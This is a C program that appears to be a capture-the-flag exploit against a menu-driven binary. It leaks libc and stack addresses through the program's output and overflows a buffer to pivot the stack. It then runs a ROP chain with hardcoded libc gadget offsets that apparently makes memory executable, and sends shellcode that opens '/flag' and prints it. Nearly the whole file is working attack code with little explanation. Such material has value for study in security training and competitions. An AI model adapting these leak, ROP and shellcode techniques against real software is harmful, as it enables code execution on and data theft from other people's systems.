#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <math.h>
#define LOCAL 0
char *shellcode = "\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xc0\x31\xd2\xb6\x01\x48\x89\xe6\x0f\x05\x6a\x01\x5f\x31\xd2\xb6\x01\x48\x89\xe6\x6a\x01\x58\x0f\x05\n";

size_t hex2int(char *hex){
    if( (hex[0]=='0' && hex[1]=='x') || (hex[0]=='0' && hex[1]=='X')){
        hex=hex+2;
    }
    int len = strlen(hex);
    if(len <1)
        return 0;
    size_t res = 0 ;
    for(int i =0 ;i!=len;i++){
        size_t tmp = (size_t )hex[i];
        if(tmp>=0x30 && tmp<=0x30+9){
            tmp = tmp-0x30;
        }else{
            tmp = tmp-'a'+10;
        }
        res = (res*16)+tmp;
    }
    return res;
}
void info(char *s){
    printf("[+] %s\n",s);
}
char* hex(size_t n){
    char *res = malloc(0x100);
    snprintf(res,0x100,"%p",n);
    return res;
}
void dump8bytes(size_t * ptr,size_t val){
    *ptr = val;
}
void * flat(size_t a[],size_t len ){
    char *payload = malloc(0x100);
    memset(payload,0,0x100);
    for(int i=0;i<len;i++){
        dump8bytes(payload+8*i,a[i]);
    }
    return payload;
}
int readfrom(int fd){
    char buffer[0x400];
    int  size = sizeof(buffer) ;
    memset(buffer,0,size);
    size = read(fd, buffer, size);
    if(size==0){
        return 0;
    }
    printf("Read %d bytes:\n================\n\n%s\n================\n\n",size,buffer);

    if(buffer[size-2]=='>')
        return 1;
    else
    {
        putchar(buffer[size-4]);
        return 0;
    }
    
}
void interact(char *payload,int size,int in,int out){
    while(1!=readfrom(out)){
        ;
    }
    sendto(in,payload,size);
}
void read2buffer(int fd,char* buffer,int size){
    memset(buffer,0,size);
    size = read(fd, buffer, size);
    
    printf("Read %d bytes:\n================\n\n%s\n================\n\n",size,buffer);
}
void sendto(int fd,char *buffer, int size){
    
    size = write(fd, buffer, size);
    printf("%d bytes are sent\n",size);   
}

int main() {
    int script_to_parent_pipe[2]; // Pipe for script's standard output to parent
    int parent_to_script_pipe[2]; // Pipe for parent's input to script
    pid_t child_pid;

    if (pipe(script_to_parent_pipe) == -1 || pipe(parent_to_script_pipe) == -1) {
        perror("Pipe creation failed");
        exit(EXIT_FAILURE);
    }

    // Fork a child process
    child_pid = fork();

    if (child_pid == -1) {
        perror("Fork failed");
        exit(EXIT_FAILURE);
    }

    if (child_pid == 0) {
        // Child process
        close(script_to_parent_pipe[0]); // Close the read end of the output pipe in the child
        close(parent_to_script_pipe[1]); // Close the write end of the input pipe in the child

        // Redirect stdout to the write end of the output pipe
        if (dup2(script_to_parent_pipe[1], STDOUT_FILENO) == -1) {
            perror("dup2 stdout failed");
            exit(EXIT_FAILURE);
        }

        // Redirect stdin to the read end of the input pipe
        if (dup2(parent_to_script_pipe[0], STDIN_FILENO) == -1) {
            perror("dup2 stdin failed");
            exit(EXIT_FAILURE);
        }

        close(script_to_parent_pipe[1]); // Close the write end of the output pipe in the child
        close(parent_to_script_pipe[0]); // Close the read end of the input pipe in the child

        // Replace the child process with the script using the exec function
        if(LOCAL){
            execlp("./main", NULL);
        }
        else{
            execlp("/main", NULL);
        }

        // The code below will only be executed if execlp fails
        perror("exec failed");
        exit(EXIT_FAILURE);
    } else {
        // Parent process
        int status;
        close(script_to_parent_pipe[1]); // Close the write end of the output pipe in the parent
        close(parent_to_script_pipe[0]); // Close the read end of the input pipe in the parent

        // File descriptors for standard input and output
        int out = script_to_parent_pipe[0];
        int in = parent_to_script_pipe[1];

        interact("1\n",2,in, out);
        if(LOCAL)
            interact("mnt/c/Users/n132/Desktop/togive/fs/main\n",40,in, out);
        else
            interact("main\n",5,in, out);

        interact("2\n",2,in,out);
        interact("1\n",2,in,out);
        if(LOCAL)
            interact("26\n\0",4,in,out);
        else
            interact("31\n\0",4,in,out);
        
        char buffer[0x400];
        read2buffer(out,buffer,0x400);
        
        char * ptr = buffer+9+12;
        *ptr = 0 ;
        size_t leaked = hex2int(buffer+9);
        
        write(in,"5\n",2);
        interact("1\n",2,in,out);
        interact("2\n\0",4,in,out);
        read2buffer(out,buffer,0x400);
        
        ptr = buffer+8+12;
        *ptr = 0 ;
        size_t leaked_stack = hex2int(buffer+8);
        printf("Leaked Stack: %p\n",leaked_stack);



        write(in,"2\n",2);
        char xyx[0x100] = {0};
        memset(xyx,'X',0x40);
        xyx[0x40]='\n';
        interact(xyx,0xff,in,out);
        
        interact("3\n",2,in,out);
        interact("1\n",2,in,out);
        
        size_t base = leaked-0x23c000;
        base = leaked  -0x18e000;

        size_t stack = leaked_stack;
        printf("Leaked Base: %p\n",base);
        size_t rdi,system,sh,setuid_addr;
        if(LOCAL)
        {        
            rdi = 0x000000000002a3e5+base;
            system = 331104+base;
            sh = 1935000+base;
            setuid_addr = 966976+base;
        }
        else{
            rdi = 0x26b10+base;
            system = 0x40fb7+base;
            sh = 0x1445f0+base;
            setuid_addr = 0xa7c21+base;
        }

        size_t list[20] = {0};
        int ct = 0;
        stack = ((stack>>12)<<12)-0x1000;
        size_t gets_addr = base + 0x5e639;
        size_t puts_addr = base + 0x5ed1e;
        size_t leave = base + 0x0000000000042473;
        list[ct++] = stack;
        list[ct++] = rdi;
        list[ct++] = stack;
        list[ct++] = gets_addr;
        list[ct++] = 0x00000000000269e2+base; //rbp
        list[ct++] = stack-8;
        list[ct++] = leave;
        
        char *p = flat(list,7);
        interact(p,7*8,in,out);
        char payload[0x1000]={0};
        memset(payload,0x42,0x1000);
        size_t rop[20] = {0};
        ct = 0;
        rop[ct++] = rdi;
        rop[ct++] = base-0x1000+0x17f000;
        rop[ct++] = 0x0000000000027e42+base;
        rop[ct++] = 0x1000;
        rop[ct++] = 0x26880+base+0xe;
        rop[ct++] = 0x7;
        rop[ct++] = 0xc7da0+base;
        rop[ct++] = rdi;
        rop[ct++] = 0;
        rop[ct++] = 0x0000000000027e42+base;
        rop[ct++] = base-0x400+0x17f000;
        rop[ct++] = 0x26880+base+0xe;
        rop[ct++] = 0x100;
        rop[ct++] = 0xc1176+base;
        rop[ct++] = base-0x400+0x17f000;

        char *n = flat(rop,ct);
        n[ct*8]='\n';

        printf("Stack: %p\n",stack);
        payload[0x100-1]=10;
        sendto(in,n,ct*8+1);

        sendto(in,shellcode,67);
        while(1)
            readfrom(out);
        close(script_to_parent_pipe[0]);
        close(parent_to_script_pipe[1]);
        // Wait for the child to finish
        wait(&status);
    }

    return 0;
}
